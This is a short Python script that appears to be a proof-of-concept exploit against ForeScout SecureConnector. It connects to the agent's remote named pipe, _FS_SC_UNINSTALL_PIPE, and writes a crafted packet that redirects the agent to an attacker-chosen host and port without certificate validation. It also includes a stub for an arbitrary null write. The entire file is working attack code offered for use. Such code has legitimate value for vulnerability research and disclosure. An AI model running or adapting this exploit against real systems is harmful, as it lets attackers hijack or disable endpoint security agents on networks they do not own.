import time
import sys
import win32pipe, win32file, pywintypes
import struct

set_redirect_details = 0x8

def make_redirect_details(host : str, port : int, hash : str):
    host_bufffer = bytearray(host,'utf8') + (b'\0' * (0x100 - len(host)))
    port_buffer = struct.pack('<H', port)
    cert_type = b'\0' * 50
    cert_hash = b'' 

    # sizes observed for different versions of SecureConnector - 0x14c and 0x24c
    packet = host_bufffer + port_buffer + cert_type + cert_hash
    packet = packet + (b'\0' * (0x24c - 4 - len(packet)))
    data = struct.pack('<I%ds' % (len(packet)), set_redirect_details, packet)
    return data

def make_packet(command_id, extra_data):
    return struct.pack('<I', command_id) + extra_data

def arb_null_write(relative_msg_offset):
    return struct.pack('<i', relative_msg_offset)


def pipe_client():

    if len(sys.argv) < 2:
        print("Usage: forescout_redirect.py agent_host")
        return

    quit = False
    while not quit:
        try:
            handle = win32file.CreateFile(
                '\\\\{}\\pipe\\_FS_SC_UNINSTALL_PIPE'.format(sys.argv[1]),
                win32file.GENERIC_READ | win32file.GENERIC_WRITE,
                0,
                None,
                win32file.OPEN_EXISTING,
                0,
                None
            )
            win32pipe.SetNamedPipeHandleState(handle, win32pipe.PIPE_READMODE_MESSAGE, None, None)   

            print("Connected to _FS_SC_UNINSTALL_PIPE pipe on host {} ".format(sys.argv[1])) 

            resp = win32file.WriteFile(handle, make_redirect_details("localhost", 10003, "0000"))
  
            win32file.CloseHandle(handle)
            
            print("Done")
            sys.stdin.readline()
            quit = True
           
        except pywintypes.error as e:
            if e.args[0] == 2:
                print("no pipe, trying again in a sec")
                time.sleep(1)
            elif e.args[0] == 109:
                print("broken pipe, bye bye")
                quit = True
            else:
                print("Failed to connect, error {}").format(e)
                quit = True

pipe_client()